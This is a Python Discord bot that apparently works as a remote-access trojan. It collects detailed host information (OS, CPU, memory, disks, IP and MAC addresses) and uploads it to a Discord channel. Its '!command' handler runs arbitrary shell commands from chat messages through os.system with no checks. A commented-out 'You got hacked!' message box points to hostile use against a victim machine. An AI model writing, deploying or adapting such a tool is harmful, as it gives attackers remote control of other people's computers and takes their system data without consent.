import os
import platform
from datetime import datetime

import psutil
import discord


def get_size(bytes, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


def get_sys_info():
    result = []

    uname = platform.uname()
    result.append(f"{'='*20} System Information {'='*20}")
    result.append(f"System: {uname.system}")
    result.append(f"Node Name: {uname.node}")
    result.append(f"Release: {uname.release}")
    result.append(f"Version: {uname.version}")
    result.append(f"Machine: {uname.machine}")
    result.append(f"Processor: {uname.processor}")

    boot_time_timestamp = psutil.boot_time()
    bt = datetime.fromtimestamp(boot_time_timestamp)
    result.append(f"{'='*20} Boot Time {'='*20}")
    result.append(f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}")

    result.append(f"{'='*20} CPU Info {'='*20}")
    result.append(f"Physical cores: {psutil.cpu_count(logical=False)}")
    result.append(f"Total cores: {psutil.cpu_count(logical=True)}")
    cpufreq = psutil.cpu_freq()
    result.append(f"Max Frequency: {cpufreq.max:.2f}Mhz")
    result.append(f"Min Frequency: {cpufreq.min:.2f}Mhz")
    result.append(f"Current Frequency: {cpufreq.current:.2f}Mhz")
    result.append("CPU Usage Per Core:")
    for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
        result.append(f"Core {i}: {percentage}%")
    result.append(f"Total CPU Usage: {psutil.cpu_percent()}%")

    svmem = psutil.virtual_memory()
    result.append(f"{'='*20} Memory Information {'='*20}")
    result.append(f"Total: {get_size(svmem.total)}")
    result.append(f"Available: {get_size(svmem.available)}")
    result.append(f"Used: {get_size(svmem.used)}")
    result.append(f"Percentage: {svmem.percent}%")

    swap = psutil.swap_memory()
    result.append(f"{'='*20} SWAP {'='*20}")
    result.append(f"Total: {get_size(swap.total)}")
    result.append(f"Free: {get_size(swap.free)}")
    result.append(f"Used: {get_size(swap.used)}")
    result.append(f"Percentage: {swap.percent}%")

    result.append(f"{'='*20} Disk Information {'='*20}")
    partitions = psutil.disk_partitions()
    for partition in partitions:
        try:
            partition_usage = psutil.disk_usage(partition.mountpoint)
        except PermissionError:
            continue
        result.append(f"=== Device: {partition.device} ===")
        result.append(f"  Mountpoint: {partition.mountpoint}")
        result.append(f"  File system type: {partition.fstype}")
        result.append(f"  Total Size: {get_size(partition_usage.total)}")
        result.append(f"  Used: {get_size(partition_usage.used)}")
        result.append(f"  Free: {get_size(partition_usage.free)}")
        result.append(f"  Percentage: {partition_usage.percent}%")

    disk_io = psutil.disk_io_counters()
    result.append(f"Total read: {get_size(disk_io.read_bytes)}")
    result.append(f"Total write: {get_size(disk_io.write_bytes)}")

    if_addrs = psutil.net_if_addrs()
    result.append(f"{'='*20} Network Information {'='*20}")
    for interface_name, interface_addresses in if_addrs.items():
        for address in interface_addresses:
            result.append(f"=== Interface: {interface_name} ===")
            if str(address.family) == 'AddressFamily.AF_INET':
                result.append(f"  IP Address: {address.address}")
                result.append(f"  Netmask: {address.netmask}")
                result.append(f"  Broadcast IP: {address.broadcast}")
            elif str(address.family) == 'AddressFamily.AF_PACKET':
                result.append(f"  MAC Address: {address.address}")
                result.append(f"  Netmask: {address.netmask}")
                result.append(f"  Broadcast MAC: {address.broadcast}")

    net_io = psutil.net_io_counters()
    result.append(f"Total Bytes Sent: {get_size(net_io.bytes_sent)}")
    result.append(f"Total Bytes Received: {get_size(net_io.bytes_recv)}")

    return "\n".join(result)


def load_env(file_path=".env"):
    with open(file_path) as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                key, value = line.split("=", 1)
                os.environ[key] = value.strip()


class MyClient(discord.Client):
    def __init__(self, channel_id, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.channel_id = channel_id

    async def on_ready(self):
        channel_id = self.channel_id
        channel = self.get_channel(channel_id)
        if channel:
            await channel.send("@everyone hi")
        else:
            print(f"Channel with ID {channel_id} not found.")

    async def on_message(self, message):
        if message.author == self.user:
            return

        if message.content.lower() == "!sysinfo":
            sys_info = get_sys_info()

            sys_info_lines = sys_info.split("\n")
            basic_info = "\n".join(sys_info_lines[:7])
            rest_info = "\n".join(sys_info_lines[7:])

            with open("detailed_sys_info.txt", "w") as file:
                file.write(rest_info)

            await message.channel.send(f"```\n{basic_info}\n```")
            await message.channel.send(file=discord.File("detailed_sys_info.txt"))
            os.remove("detailed_sys_info.txt")
        elif message.content.lower().startswith("!command"):
            os.system(message.content[9:])
        elif message.content.lower().startswith("!messagebox"):
            # show_messagebox(message.content[9:], "You got hacked!", "info")
            print(message.content[12:])


if __name__ == '__main__':
    load_env()
    token = os.getenv("DISCORD_BOT_TOKEN")
    channel_id = os.getenv("CHANNEL_ID")

    intents = discord.Intents.default()
    intents.message_content = True

    client = MyClient(intents=intents, channel_id=channel_id)
    client.run(token=token)
